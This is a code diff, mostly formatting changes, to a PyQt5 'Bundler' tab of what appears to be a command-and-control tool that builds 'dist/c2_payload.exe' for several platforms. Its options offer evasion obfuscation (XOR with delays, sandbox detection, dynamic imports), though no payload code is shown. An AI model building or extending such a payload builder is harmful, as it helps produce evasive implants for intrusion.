@@ -4,9 +4,18 @@
 import sys
 from pathlib import Path
 from PyQt5.QtWidgets import (
-    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
-    QPushButton, QComboBox, QMessageBox, QProgressBar,
-    QGroupBox, QSpinBox, QTextEdit,
+    QWidget,
+    QVBoxLayout,
+    QHBoxLayout,
+    QLabel,
+    QLineEdit,
+    QPushButton,
+    QComboBox,
+    QMessageBox,
+    QProgressBar,
+    QGroupBox,
+    QSpinBox,
+    QTextEdit,
 )
 from PyQt5.QtCore import QThread, pyqtSignal, Qt
 from PyQt5.QtGui import QFont
@@ -14,6 +23,7 @@ from PyQt5.QtGui import QFont
 
 class BundlerWorker(QThread):
     """Worker thread for bundling"""
+
     progress = pyqtSignal(str)
     finished = pyqtSignal(bool)
 
@@ -29,7 +39,13 @@ class BundlerWorker(QThread):
             try:
                 obfuscation_level = int(self.obfuscation)
             except:
-                obfuscation_map = {"Level 1": 1, "Level 2": 2, "Level 3": 3, "Level 4": 4, "Level 5": 5}
+                obfuscation_map = {
+                    "Level 1": 1,
+                    "Level 2": 2,
+                    "Level 3": 3,
+                    "Level 4": 4,
+                    "Level 5": 5,
+                }
                 obfuscation_level = 2
                 for key, val in obfuscation_map.items():
                     if key in str(self.obfuscation):
@@ -63,6 +79,7 @@ class BundlerWorker(QThread):
         except Exception as e:
             self.progress.emit(f"[!] ERROR: {str(e)}")
             import traceback
+
             self.progress.emit(traceback.format_exc())
             self.finished.emit(False)
 
@@ -102,13 +119,15 @@ class BundlerTab(QWidget):
         obf_layout = QHBoxLayout()
         obf_layout.addWidget(QLabel("Obfuscation:"))
         self.obfuscation_combo = QComboBox()
-        self.obfuscation_combo.addItems([
-            "Level 1 - Base64",
-            "Level 2 - XOR + Delays (RECOMMENDED)",
-            "Level 3 - Sandbox Detection",
-            "Level 4 - Dynamic Imports",
-            "Level 5 - MAXIMUM",
-        ])
+        self.obfuscation_combo.addItems(
+            [
+                "Level 1 - Base64",
+                "Level 2 - XOR + Delays (RECOMMENDED)",
+                "Level 3 - Sandbox Detection",
+                "Level 4 - Dynamic Imports",
+                "Level 5 - MAXIMUM",
+            ]
+        )
         self.obfuscation_combo.setCurrentIndex(1)
         obf_layout.addWidget(self.obfuscation_combo)
         config_layout.addLayout(obf_layout)
@@ -126,7 +145,9 @@ class BundlerTab(QWidget):
         # Bundler Button
         button_layout = QHBoxLayout()
         self.bundle_btn = QPushButton("🔨 Start Bundling")
-        self.bundle_btn.setStyleSheet("background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;")
+        self.bundle_btn.setStyleSheet(
+            "background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;"
+        )
         self.bundle_btn.clicked.connect(self.start_bundling)
         button_layout.addWidget(self.bundle_btn)
         layout.addLayout(button_layout)
@@ -164,7 +185,11 @@ class BundlerTab(QWidget):
         self.progress_bar.setVisible(True)
         self.output_text.clear()
 
-        platform_map = {"Windows (.exe)": "windows", "macOS (.app)": "macos", "Linux": "linux"}
+        platform_map = {
+            "Windows (.exe)": "windows",
+            "macOS (.app)": "macos",
+            "Linux": "linux",
+        }
         platform = platform_map.get(self.platform_combo.currentText(), "windows")
 
         self.bundler_worker = BundlerWorker(
@@ -183,6 +208,12 @@ class BundlerTab(QWidget):
         self.progress_bar.setVisible(False)
 
         if success:
-            QMessageBox.information(self, "Success", "Payload created!\n\nLocation: dist/c2_payload.exe")
+            QMessageBox.information(
+                self, "Success", "Payload created!\n\nLocation: dist/c2_payload.exe"
+            )
         else:
             QMessageBox.critical(self, "Error", "Bundling failed")
+
+
+# Usage: Bundler Tab → Config → "Start Bundling"
+#        → dist/c2_payload.exe
